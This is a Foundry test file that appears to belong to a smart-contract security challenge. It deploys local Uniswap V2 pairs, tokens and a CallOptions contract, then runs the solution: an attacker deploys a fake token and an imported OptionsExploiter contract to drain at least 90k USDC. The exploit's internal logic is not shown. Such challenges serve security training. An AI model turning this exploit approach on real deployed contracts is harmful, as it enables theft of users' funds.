// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Token} from "src/other/Token.sol";
import {CallOptions} from "src/side-entrance/CallOptions.sol";

import {OptionsExploiter} from "src/side-entrance/OptionsExploiter.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used
    address adminUser2 = makeAddr('adminUser2'); // should not be used

    IUniswapV2Factory uniFactory;
    IUniswapV2Router02 uniRouter;
    IUniswapV2Pair usdcDaiPair;
    IUniswapV2Pair usdcEthPair;
    IWETH weth;
    Token usdc;
    Token dai;
    CallOptions optionsContract;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);
        vm.deal(adminUser2, 10_000 ether);

        // deploying token contracts
        vm.prank(admin);
        usdc = new Token('USDC','USDC');

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0]=admin; addresses[1]=adminUser;
        amounts[0]=2_000_000e18; amounts[1]=100_000e18;
        vm.prank(admin);
        usdc.mintPerUser(addresses,amounts);

        vm.prank(admin);
        dai = new Token('DAI','DAI');

        vm.prank(admin);
        dai.mint(admin,1_000_000e18);

        // deploying uniswap contracts
        weth = IWETH(
            deployCode("src/other/uniswap-build/WETH9.json")
        );
        uniFactory = IUniswapV2Factory(
            deployCode(
                "src/other/uniswap-build/UniswapV2Factory.json",
                abi.encode(admin)
            )
        );
        uniRouter = IUniswapV2Router02(
            deployCode(
                "src/other/uniswap-build/UniswapV2Router02.json",
                abi.encode(address(uniFactory),address(weth))
            )
        );

        // --getting wETH
        vm.prank(admin);
        weth.deposit{value:500e18}();
        vm.prank(adminUser2);
        weth.deposit{value:50e18}();

        // --adding initial liquidity for DAI-USDC
        vm.prank(admin);
        usdc.approve(address(uniRouter),type(uint).max);
        vm.prank(admin);
        dai.approve(address(uniRouter),type(uint).max);
        vm.prank(admin);
        IERC20(address(weth)).approve(address(uniRouter),type(uint).max);

        vm.prank(admin);
        uniRouter.addLiquidity( // creates USDC-DAI pair
            address(usdc),address(dai),
            1_000_000e18,1_000_000e18,
            0,0,
            admin,block.timestamp
        );

        usdcDaiPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(dai)));

        vm.prank(admin);
        uniRouter.addLiquidity( // creates USDC-wETH pair
            address(usdc),address(weth),
            1_000_000e18,500e18,
            0,0,
            admin,block.timestamp
        );

        usdcEthPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(weth)));

        // deploying core contracts
        vm.prank(admin);
        optionsContract = new CallOptions(
            address(usdc),
            address(weth),
            address(usdcEthPair),
            address(uniFactory),
            address(uniRouter)
        );

        // --interacting with core contracts
        vm.prank(adminUser2);
        IERC20(address(weth)).approve(address(optionsContract),type(uint).max);

        vm.prank(adminUser2);
        optionsContract.createOption(
            1e18,2_100e18,100e18,
            uint128(block.timestamp+(60*60*24*7)) // one week
        );

        vm.prank(adminUser);
        bytes32 createdOptionId = optionsContract.getLatestOptionId();
        vm.prank(adminUser);
        usdc.approve(address(optionsContract),type(uint).max);
        vm.prank(adminUser);
        optionsContract.purchaseOption(createdOptionId);

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        Token fake = new Token('Fs','Fs');

        OptionsExploiter exploiter = new OptionsExploiter(
            address(usdcDaiPair),
            address(uniRouter),
            address(fake),
            address(usdc),
            address(uniFactory),
            address(optionsContract)
        );

        fake.mint(address(exploiter),2_101e18);

        bytes32 optionId = optionsContract.getLatestOptionId();
        exploiter.runExploit(2_101e18,optionId);

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker steals at least 90k USDC
        assertGe(usdc.balanceOf(attacker),90_000e18);

    }

}